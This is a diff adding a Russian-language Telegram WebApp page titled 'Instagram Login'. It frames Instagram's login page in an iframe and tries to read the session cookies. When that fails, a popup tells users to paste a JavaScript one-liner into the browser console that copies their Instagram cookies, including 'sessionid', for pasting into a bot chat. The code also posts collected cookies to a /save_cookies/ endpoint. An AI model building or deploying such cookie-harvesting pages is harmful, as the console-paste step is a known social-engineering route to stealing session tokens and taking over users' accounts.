@@ -1,0 +1,324 @@
+<!DOCTYPE html>
+<html lang="ru">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Instagram Login</title>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
+            background: var(--tg-theme-bg-color, #ffffff);
+            color: var(--tg-theme-text-color, #000000);
+            height: 100vh;
+            overflow: hidden;
+        }
+        
+        #container {
+            height: 100vh;
+            display: flex;
+            flex-direction: column;
+        }
+        
+        #header {
+            background: var(--tg-theme-secondary-bg-color, #f0f0f0);
+            padding: 15px;
+            text-align: center;
+            border-bottom: 1px solid rgba(0,0,0,0.1);
+            flex-shrink: 0;
+        }
+        
+        #header h3 {
+            margin: 0;
+            color: var(--tg-theme-text-color, #000);
+            font-size: 16px;
+        }
+        
+        #header p {
+            margin: 5px 0 0;
+            color: var(--tg-theme-hint-color, #999);
+            font-size: 12px;
+        }
+        
+        #iframe-container {
+            flex: 1;
+            position: relative;
+            overflow: hidden;
+        }
+        
+        #instagram-frame {
+            width: 100%;
+            height: 100%;
+            border: none;
+        }
+        
+        #loading {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            z-index: 10;
+        }
+        
+        .spinner {
+            border: 4px solid rgba(0, 0, 0, 0.1);
+            border-left-color: var(--tg-theme-button-color, #0088cc);
+            border-radius: 50%;
+            width: 50px;
+            height: 50px;
+            animation: spin 1s linear infinite;
+            margin: 0 auto 15px;
+        }
+        
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+        
+        #success-screen {
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: var(--tg-theme-bg-color, white);
+            display: none;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            z-index: 100;
+            padding: 30px;
+        }
+        
+        #success-screen.active {
+            display: flex;
+        }
+        
+        .success-icon {
+            font-size: 80px;
+            margin-bottom: 20px;
+            animation: scaleIn 0.5s ease-out;
+        }
+        
+        @keyframes scaleIn {
+            from { transform: scale(0); }
+            to { transform: scale(1); }
+        }
+        
+        #status {
+            margin-top: 10px;
+            padding: 10px 15px;
+            border-radius: 8px;
+            font-size: 14px;
+            text-align: center;
+        }
+        
+        .status-info {
+            background: var(--tg-theme-secondary-bg-color, #e3f2fd);
+            color: var(--tg-theme-text-color, #1976d2);
+        }
+        
+        .status-error {
+            background: #ffebee;
+            color: #c62828;
+        }
+        
+        .status-success {
+            background: #e8f5e9;
+            color: #2e7d32;
+        }
+    </style>
+</head>
+<body>
+    <div id="container">
+        <div id="header">
+            <h3>🔐 Вход в Instagram</h3>
+            <p>Войдите в свой аккаунт, затем нажмите "Отправить"</p>
+        </div>
+        
+        <div id="iframe-container">
+            <div id="loading">
+                <div class="spinner"></div>
+                <p>Загрузка Instagram...</p>
+            </div>
+            
+            <iframe id="instagram-frame" src="https://www.instagram.com/accounts/login/" sandbox="allow-same-origin allow-scripts allow-forms allow-popups"></iframe>
+        </div>
+        
+        <div id="success-screen">
+            <div class="success-icon">✅</div>
+            <h2>Успешно!</h2>
+            <p id="success-message">Cookies получены и сохранены</p>
+            <div id="status" class="status-info"></div>
+        </div>
+    </div>
+
+    <script>
+        // Initialize Telegram WebApp
+        const tg = window.Telegram.WebApp;
+        tg.expand();
+        tg.ready();
+        
+        const telegramUser = tg.initDataUnsafe?.user;
+        const chatId = telegramUser?.id;
+        
+        console.log('Telegram User ID:', chatId);
+        
+        const iframe = document.getElementById('instagram-frame');
+        const loading = document.getElementById('loading');
+        const successScreen = document.getElementById('success-screen');
+        const statusDiv = document.getElementById('status');
+        
+        // Hide loading when iframe loads
+        iframe.addEventListener('load', function() {
+            loading.style.display = 'none';
+        });
+        
+        // Show status message
+        function showStatus(message, type) {
+            statusDiv.textContent = message;
+            statusDiv.className = `status-${type}`;
+        }
+        
+        // Extract cookies from iframe (will fail due to CORS)
+        async function getCookiesFromIframe() {
+            try {
+                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
+                const cookies = iframeDoc.cookie;
+                
+                if (cookies && cookies.includes('sessionid')) {
+                    return parseCookies(cookies);
+                }
+            } catch (e) {
+                console.log('Cannot access iframe cookies (CORS):', e);
+            }
+            return null;
+        }
+        
+        // Parse cookie string
+        function parseCookies(cookieString) {
+            return cookieString.split(';').map(c => {
+                const [name, ...rest] = c.trim().split('=');
+                return {
+                    name: name,
+                    value: rest.join('='),
+                    domain: '.instagram.com',
+                    path: '/',
+                    expires: -1
+                };
+            }).filter(c => c.name && c.value);
+        }
+        
+        // Manual cookie input fallback
+        async function requestManualCookies() {
+            showStatus('Из-за ограничений браузера нужно скопировать cookies вручную', 'info');
+            
+            // Show popup with instructions
+            tg.showPopup({
+                title: 'Скопируйте cookies',
+                message: 'Откройте консоль (F12), вставьте:\n\ncopy(JSON.stringify(document.cookie.split(";").map(c=>{const[n,...v]=c.trim().split("=");return{name:n,value:v.join("="),domain:".instagram.com",path:"/",expires:-1}})))\n\nЗатем вставьте результат в чат бота.',
+                buttons: [
+                    {id: 'close', type: 'close', text: 'Закрыть'}
+                ]
+            });
+        }
+        
+        // Send cookies to server
+        async function sendCookiesToServer(cookies, igUsername) {
+            try {
+                showStatus('Отправка cookies на сервер...', 'info');
+                
+                const response = await fetch('/save_cookies/', {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json',
+                    },
+                    body: JSON.stringify({
+                        telegram_user_id: chatId,
+                        ig_username: igUsername,
+                        cookies: cookies
+                    })
+                });
+                
+                const result = await response.json();
+                
+                if (result.success) {
+                    // Show success screen
+                    successScreen.classList.add('active');
+                    document.getElementById('success-message').textContent = 
+                        `Сессия @${result.ig_username} сохранена! (${result.cookies_count} cookies)`;
+                    showStatus('✅ Можете закрыть это окно', 'success');
+                    
+                    // Send confirmation to bot via WebApp
+                    tg.sendData(JSON.stringify({
+                        action: 'session_saved',
+                        session_id: result.session_id,
+                        ig_username: result.ig_username
+                    }));
+                    
+                    // Auto close after 2 seconds
+                    setTimeout(() => {
+                        tg.close();
+                    }, 2000);
+                } else {
+                    showStatus(`Ошибка: ${result.error}`, 'error');
+                }
+                
+            } catch (error) {
+                console.error('Error sending cookies:', error);
+                showStatus(`Ошибка отправки: ${error.message}`, 'error');
+            }
+        }
+        
+        // Main button handler
+        tg.MainButton.text = "📤 Отправить cookies в бот";
+        tg.MainButton.color = tg.themeParams.button_color || '#0088cc';
+        tg.MainButton.textColor = tg.themeParams.button_text_color || '#ffffff';
+        tg.MainButton.show();
+        
+        tg.MainButton.onClick(async function() {
+            tg.MainButton.showProgress();
+            
+            // Try to get cookies from iframe
+            let cookies = await getCookiesFromIframe();
+            
+            if (!cookies) {
+                // CORS blocked - need manual input
+                tg.MainButton.hideProgress();
+                await requestManualCookies();
+                return;
+            }
+            
+            // Prompt for Instagram username
+            const igUsername = prompt('Введите ваш Instagram username:');
+            if (!igUsername) {
+                tg.MainButton.hideProgress();
+                showStatus('Отменено - не указан username', 'error');
+                return;
+            }
+            
+            // Send to server
+            await sendCookiesToServer(cookies, igUsername.replace('@', ''));
+            tg.MainButton.hideProgress();
+        });
+        
+        // Back button
+        tg.BackButton.show();
+        tg.BackButton.onClick(function() {
+            tg.close();
+        });
+        
+        // Show welcome message
+        setTimeout(() => {
+            showStatus('Войдите в Instagram выше, затем нажмите "Отправить"', 'info');
+        }, 2000);
+    </script>
+</body>
+</html>
+
